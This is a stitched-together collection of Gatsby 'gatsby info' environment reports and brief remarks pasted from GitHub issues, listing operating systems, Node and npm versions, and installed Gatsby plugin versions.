$ yarn gatsby info --clipboard yarn run v1.21.1 $ c:\\users\\alexa\\bb2\ ode_modules\\.bin\\gatsby info --clipboard system: os: windows 10 10.0.18363 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: node: 13.7.0 - c:\\users\\alexa\\appdata\\local\\temp\\yarn--1582924389588-0.9135959853559317\ ode.cmd yarn: 1.21.1 - c:\\users\\alexa\\appdata\\local\\temp\\yarn--1582924389588-0.9135959853559317\\yarn.cmd npm: 6.13.6 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.19.23 => 2.19.23 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-manifest: 2.2.42 => 2.2.42 gatsby-plugin-offline: 3.0.35 => 3.0.35 gatsby-plugin-react-helmet: 3.1.22 => 3.1.22 gatsby-plugin-sharp: 2.4.5 => 2.4.5 gatsby-plugin-styled-components: 3.1.19 => 3.1.19 gatsby-source-filesystem: 2.1.48 => 2.1.48 gatsby-transformer-sharp: 2.3.16 => 2.3.16 ``` ### my best guess
i just converted this project from a create-react-app project
then i kept the router in the app.js file instead of using the pages folder, because that seemed like a comfortable shortcut to not have to bother with achieving all the routing in pages: #l86-l101 works fine in dev mode and even when running `gatsby serve`
probably this is not expected and breaks in the build?
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.18.1 - ~/n/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.29
<details> ``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.7.0 - /usr/local/bin/node npm: 6.14.1 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 safari: 13.0.5 npmpackages: gatsby: ^2.19.23 => 2.19.23 gatsby-plugin-mdx: ^1.0.74 => 1.0.74 gatsby-source-filesystem: ^2.1.48 => 2.1.48 ``` </details>
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.0 - ~/.nvm/versions/node/v12.16.0/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.13.50 => 2.19.22 gatsby-image: ^2.2.8 => 2.2.41 gatsby-plugin-manifest: ^2.2.4 => 2.2.42 gatsby-plugin-mdx: ^1.0.0 => 1.0.74 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.22 gatsby-plugin-sharp: ^2.2.9 => 2.4.5 gatsby-remark-prismjs: ^3.3.31 => 3.3.31 gatsby-source-filesystem: ^2.1.8 => 2.1.48 gatsby-transformer-sharp: ^2.2.5 => 2.3.16 npmglobalpackages: gatsby-dev-cli: 2.5.44
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.8.0 - /usr/local/bin/node npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.12 => 2.19.12 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-csp: ^1.1.3 => 1.1.3 gatsby-plugin-feed: ^2.3.26 => 2.3.26 gatsby-plugin-manifest: ^2.2.40 => 2.2.40 gatsby-plugin-netlify-cms: ^4.1.37 => 4.1.37 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.27 => 2.1.27 gatsby-plugin-sharp: ^2.4.4 => 2.4.4 gatsby-plugin-sitemap: ^2.2.26 => 2.2.26 gatsby-plugin-typescript: ^2.1.26 => 2.1.26 gatsby-remark-images: ^3.1.44 => 3.1.44 gatsby-remark-prismjs: ^3.3.30 => 3.3.30 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-remark: ^2.6.50 => 2.6.50 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 gatsby-transformer-yaml: ^2.2.23 => 2.2.23 npmglobalpackages: gatsby-cli: 2.9.0
system: os: windows 10 10.0.17763 cpu: (4) x64 intel(r) core(tm) i5-4570 cpu @ 3.20ghz binaries: node: 12.14.1 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2
``` system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2400s cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 firefox: 61.0.1 safari: 13.0.3 npmpackages: gatsby: ^2.15.28 => 2.18.8 gatsby-image: ^2.2.23 => 2.2.34 gatsby-link: ^2.2.17 => 2.2.25 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-feed: ^2.3.15 => 2.3.23 gatsby-plugin-google-analytics: ^2.1.19 => 2.1.29 gatsby-plugin-manifest: ^2.2.20 => 2.2.31 gatsby-plugin-mdx: ^1.0.46 => 1.0.59 gatsby-plugin-offline: ^3.0.11 => 3.0.27 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.16 gatsby-plugin-sharp: ^2.2.27 => 2.3.5 gatsby-plugin-sitemap: ^2.2.16 => 2.2.22 gatsby-plugin-styled-components: ^3.1.8 => 3.1.14 gatsby-plugin-twitter: ^2.1.9 => 2.1.15 gatsby-plugin-typescript: ^2.1.11 => 2.1.20 gatsby-remark-copy-linked-files: ^2.1.23 => 2.1.31 gatsby-remark-images: ^3.1.25 => 3.1.35 gatsby-remark-prismjs: ^3.3.16 => 3.3.25 gatsby-remark-smartypants: ^2.1.11 => 2.1.17 gatsby-source-filesystem: ^2.1.28 => 2.1.40 gatsby-transformer-json: ^2.2.13 => 2.2.20 gatsby-transformer-remark: ^2.6.26 => 2.6.39 gatsby-transformer-sharp: ^2.2.19 => 2.3.7 npmglobalpackages: gatsby-cli: 2.8.30
system: os: macos mojave 10.14.5 cpu: (4) x64 intel(r) core(tm) i7-6660u cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.21.1 - ~/.yarn/bin/yarn npm: 6.10.1 - /usr/local/bin/npm languages: python: 3.7.5 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 80.0.3987.122 firefox: 72.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.9.4 => 2.18.16 gatsby-image: ^2.1.4 => 2.2.37 gatsby-plugin-emotion: ^4.1.22 => 4.1.22 gatsby-plugin-feed: ^2.2.3 => 2.3.25 gatsby-plugin-google-analytics: ^2.1.4 => 2.1.31 gatsby-plugin-manifest: ^2.1.1 => 2.2.34 gatsby-plugin-offline: ^2.1.3 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.18 gatsby-plugin-sharp: ^2.1.5 => 2.4.5 gatsby-plugin-typescript: ^2.0.15 => 2.1.23 gatsby-plugin-typography: ^2.2.13 => 2.3.20 gatsby-remark-copy-linked-files: ^2.0.13 => 2.1.33 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.0.16 => 3.1.39 gatsby-remark-prismjs: ^3.2.11 => 3.3.28 gatsby-remark-responsive-iframe: ^2.1.1 => 2.2.30 gatsby-remark-smartypants: ^2.0.9 => 2.1.19 gatsby-source-filesystem: ^2.0.39 => 2.1.43 gatsby-transformer-remark: ^2.4.0 => 2.6.45 gatsby-transformer-sharp: ^2.3.15 => 2.3.15
``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 10.15.2 - /usr/bin/node npm: 5.8.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.116 firefox: 68.5.0esr npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-feed: ^2.3.26 => 2.3.26 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.34 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-plugin-typography: ^2.3.21 => 2.3.21 gatsby-remark-copy-linked-files: ^2.1.36 => 2.1.36 gatsby-remark-images: ^3.1.42 => 3.1.42 gatsby-remark-prismjs: ^3.3.30 => 3.3.30 gatsby-remark-responsive-iframe: ^2.2.31 => 2.2.31 gatsby-remark-smartypants: ^2.1.20 => 2.1.20 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-remark: ^2.6.48 => 2.6.48 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 ```
``` system: os: linux 5.5 arch linux cpu: (8) x64 intel(r) core(tm) i7-6700 cpu @ 3.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.6.0 - ~/.nvm/versions/node/v13.6.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v13.6.0/bin/npm languages: python: 3.8.1 - /usr/bin/python npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 10.15.2 - /usr/bin/node npm: 5.8.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.116 firefox: 68.5.0esr npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-feed: ^2.3.26 => 2.3.26 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.34 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-plugin-typography: ^2.3.21 => 2.3.21 gatsby-remark-copy-linked-files: ^2.1.36 => 2.1.36 gatsby-remark-images: ^3.1.42 => 3.1.42 gatsby-remark-prismjs: ^3.3.30 => 3.3.30 gatsby-remark-responsive-iframe: ^2.2.31 => 2.2.31 gatsby-remark-smartypants: ^2.1.20 => 2.1.20 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-remark: ^2.6.48 => 2.6.48 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 ```
``` system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (4) x64 intel(r) core(tm) i5-6600 cpu @ 3.30ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.10.1 - /usr/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 62.0.3202.94 firefox: 73.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-remark-color-highlight: ^1.0.2 => 1.0.2 gatsby-theme-blog: ^1.2.35 => 1.2.35 ``` **if you feel like it belongs somewhere else, i would gladly close the issue and open it in another repo!**
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - /usr/local/bin/node npm: 6.12.1 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.116 firefox: 72.0.2 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.27
providing the post-upgrades version here, but the in-project version's `gatsby info` is detailed in the first gist linked above
$ npx gatsby info system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 13.7.0 - /usr/local/opt/asdf/shims/node npm: 6.13.7 - /usr/local/opt/asdf/shims/npm languages: python: 3.7.5 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 79.0.3945.130 firefox: 71.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.17 => 2.19.17 gatsby-core-utils: ^1.0.28 => 1.0.28 gatsby-image: ^2.2.41 => 2.2.41 gatsby-plugin-google-analytics: ^2.1.35 => 2.1.35 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-typography: ^2.3.22 => 2.3.22 gatsby-source-contentful: ^2.1.86 => 2.1.86 gatsby-transformer-remark: ^2.6.51 => 2.6.51 npmglobalpackages: gatsby-cli: 2.8.27
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.8.0 - /usr/local/bin/node npm: 6.10.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.106 firefox: 71.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.5 => 2.19.5 gatsby-plugin-disqus: ^1.1.4 => 1.1.4 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.34 gatsby-plugin-google-tagmanager: ^2.1.24 => 2.1.24 gatsby-plugin-less: ^3.0.18 => 3.0.18 gatsby-plugin-lodash: ^3.1.19 => 3.1.19 gatsby-plugin-manifest: ^2.2.38 => 2.2.38 gatsby-plugin-mdx: ^1.0.67 => 1.0.67 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.1.20 => 2.1.20 gatsby-plugin-sass: ^2.1.27 => 2.1.27 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-graphql: ^2.1.32 => 2.1.32 gatsby-source-shopify: ^3.0.41 => 3.0.41 gatsby-source-youtube: ^1.0.1 => 1.0.1 gatsby-transformer-yaml: ^2.2.23 => 2.2.23 npmglobalpackages: gatsby-cli: 2.8.27
iphone x, ios 13, safari
``` system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.3 - /bin/bash binaries: node: 11.15.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 72.0.2 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.29
system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.3 - /bin/bash binaries: node: 12.15.0 - /tmp/yarn--1581573867501-0.4081065427154833/node yarn: 1.22.0 - /tmp/yarn--1581573867501-0.4081065427154833/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.15.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 80.0.3987.87 firefox: 72.0.2 npmpackages: gatsby: ^2.18.3 => 2.19.12 gatsby-gravityforms-component: ^2.0.0 => 2.0.0 gatsby-image: ^2.2.33 => 2.2.40 gatsby-plugin-google-tagmanager: ^2.1.24 => 2.1.25 gatsby-plugin-manifest: ^2.2.29 => 2.2.41 gatsby-plugin-netlify: ^2.1.30 => 2.1.32 gatsby-plugin-offline: ^3.0.23 => 3.0.34 gatsby-plugin-preact: ^3.1.24 => 3.1.26 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.22 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.26 => 2.1.28 gatsby-plugin-sharp: ^2.3.3 => 2.4.5 gatsby-plugin-sitemap: ^2.2.26 => 2.2.27 gatsby-source-filesystem: ^2.1.38 => 2.1.48 gatsby-source-graphql: ^2.1.24 => 2.1.33 gatsby-source-gravityforms: ^1.0.15 => 1.0.15 gatsby-transformer-json: ^2.2.25 => 2.2.26 gatsby-transformer-sharp: ^2.3.5 => 2.3.14
(if relevant)
``` system: os: linux 5.3 pop!_os 19.10 cpu: (12) x64 intel(r) core(tm) i7-5820k cpu @ 3.30ghz shell: 5.0.3 - /bin/bash binaries: node: 13.7.0 - /home/linuxbrew/.linuxbrew/bin/node yarn: 1.21.1 - /home/linuxbrew/.linuxbrew/bin/yarn npm: 6.13.6 - /home/linuxbrew/.linuxbrew/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 80.0.3987.87 firefox: 72.0.2 npmpackages: gatsby: ^2.19.16 => 2.19.16 gatsby-image: ^2.2.40 => 2.2.40 gatsby-plugin-manifest: ^2.2.41 => 2.2.41 gatsby-plugin-netlify: ^2.1.32 => 2.1.32 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.0.34 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-source-prismic-graphql: ^3.4.1-alpha.0 => 3.4.1-alpha.0+474efaa gatsby-transformer-sharp: ^2.3.14 => 2.3.14
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-9700k cpu @ 3.60ghz binaries: node: 12.13.1 - d:\ odejs\ ode.exe npm: 6.13.7 - d:\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.18.12 => 2.19.12 gatsby-image: ^2.2.34 => 2.2.40 gatsby-plugin-manifest: ^2.2.31 => 2.2.41 gatsby-plugin-offline: ^3.0.27 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.22
``` [local]:
[pr]:
``` system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 79.0.3945.130 safari: 13.0 npmpackages: gatsby: ^2.19.12 => 2.19.12 gatsby-image: ^2.2.40 => 2.2.40 gatsby-plugin-catch-links: ^2.1.25 => 2.1.25 gatsby-plugin-google-analytics: ^2.1.35 => 2.1.35 gatsby-plugin-manifest: ^2.2.41 => 2.2.41 gatsby-plugin-offline: ^3.0.34 => 3.0.34 gatsby-plugin-postcss: ^2.1.20 => 2.1.20 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-s3: ^0.3.2 => 0.3.2 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-sitemap: ^2.2.27 => 2.2.27 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-plugin-zopfli: ^1.3.2 => 1.3.2 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-source-graphql: ^2.1.25 => 2.1.25 gatsby-transformer-sharp: ^2.3.14 => 2.3.14 ```
``` system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.19.1 - ~/.npm-global/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 firefox: 72.0.2 safari: 13.0.4 npmpackages: gatsby: ^2.18.4 => 2.19.12 gatsby-image: ^2.2.34 => 2.2.40 gatsby-plugin-manifest: ^2.2.30 => 2.2.41 gatsby-plugin-offline: ^3.0.24 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.22 gatsby-plugin-sharp: ^2.3.4 => 2.4.5 gatsby-source-filesystem: ^2.1.39 => 2.1.48 gatsby-transformer-sharp: ^2.3.6 => 2.3.14 npmglobalpackages: gatsby-cli: 2.8.14 ```
this is from the repo @pieh set up that uses the default gatsby starter
system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 12.2.0 - ~/.nvm/versions/node/v12.2.0/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.2.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 79.0.3945.130 firefox: 65.0.1 safari: 12.0.2 npmpackages: gatsby: ^2.18.12 => 2.19.1 npmglobalpackages: gatsby-cli: 2.8.1 ### other information if a gatsby core member would like to see the manual workaround i do in a production environment, i am happy to share our client project repo and a staging link privately.
``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.6.0 - ~/.nvm/versions/node/v13.6.0/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v13.6.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 safari: 13.0.5 npmpackages: gatsby: ^2.16.0 => 2.16.0 gatsby-plugin-catch-links: ^2.1.25 => 2.1.25 gatsby-plugin-manifest: ^2.2.41 => 2.2.41 gatsby-plugin-offline: ^3.0.34 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sass: ^2.1.28 => 2.1.28 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-remark-images: ^3.1.44 => 3.1.44 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-contentful: ^2.1.85 => 2.1.85 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-remark: ^2.6.50 => 2.6.50 gatsby-transformer-sharp: ^2.3.14 => 2.3.14 npmglobalpackages: gatsby-cli: 2.8.27
gatsby cli version: 2.8.27
gatsby version: 2.16.0 note: this is the gatsby version for the site at: /users/tris/sites/tris/tris-gatsby
``` `netlify-cli/2.31.0 darwin-x64 node-v13.6.0`
<summary>`gatsby info --clipboard`</summary> system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 safari: 13.0.5 npmpackages: gatsby: 2.18.20 => 2.18.20 gatsby-image: 2.2.40 => 2.2.40 gatsby-plugin-algolia: ^0.5.0 => 0.5.0 gatsby-plugin-catch-links: 2.1.25 => 2.1.25 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: 2.1.35 => 2.1.35 gatsby-plugin-lodash: ^3.1.16 => 3.1.20 gatsby-plugin-manifest: 2.2.41 => 2.2.41 gatsby-plugin-mdx: ^1.0.59 => 1.0.70 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: 3.0.34 => 3.0.34 gatsby-plugin-react-helmet: 3.1.22 => 3.1.22 gatsby-plugin-sharp: 2.4.5 => 2.4.5 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-remark-autolink-headers: ^2.1.19 => 2.1.24 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.1.31 => 2.1.37 gatsby-remark-embed-video: 2.0.1 => 2.0.1 gatsby-remark-emojis: ^0.4.2 => 0.4.2 gatsby-remark-images: 3.1.44 => 3.1.44 gatsby-remark-katex: ^3.1.18 => 3.1.24 gatsby-remark-responsive-iframe: 2.2.32 => 2.2.32 gatsby-remark-smartypants: 2.1.21 => 2.1.21 gatsby-remark-sub-sup: ^1.0.0 => 1.0.0 gatsby-remark-vscode: ^2.0.1 => 2.0.1 gatsby-source-filesystem: 2.1.48 => 2.1.48 gatsby-transformer-sharp: 2.3.14 => 2.3.14 gatsby-transformer-yaml: 2.2.24 => 2.2.24 </details>
``` system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 10.18.1 - /usr/local/opt/node@10/bin/node npm: 6.13.4 - /usr/local/opt/node@10/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 safari: 13.0.4 npmpackages: gatsby: ^2.19.12 => 2.19.12 gatsby-image: ^2.2.40 => 2.2.40 gatsby-plugin-manifest: ^2.2.41 => 2.2.41 gatsby-plugin-offline: ^3.0.34 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-source-graphql: ^2.1.33 => 2.1.33 gatsby-transformer-sharp: ^2.3.14 => 2.3.14 npmglobalpackages: gatsby-cli: 2.8.28
system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-4770 cpu @ 3.40ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.17763.831.0
gatsby version 2.15 and up
node: 12.13.1
gatsby-source-contentful: ^2.1.65
``` system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.19.1 - ~/.nvm/versions/node/v12.13.0/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 firefox: 71.0 safari: 13.0.4 npmpackages: gatsby: ^2.18.17 => 2.19.8 gatsby-image: ^2.2.37 => 2.2.39 gatsby-link: ^2.2.27 => 2.2.28 gatsby-plugin-gtag: ^1.0.12 => 1.0.12 gatsby-plugin-mailchimp: ^5.1.2 => 5.1.2 gatsby-plugin-manifest: ^2.2.34 => 2.2.39 gatsby-plugin-offline: ^3.0.30 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.21 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-remove-trailing-slashes: ^2.1.17 => 2.1.20 gatsby-plugin-sass: ^2.1.26 => 2.1.27 gatsby-plugin-sharp: ^2.3.10 => 2.4.3 gatsby-plugin-sitemap: ^2.2.24 => 2.2.26 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 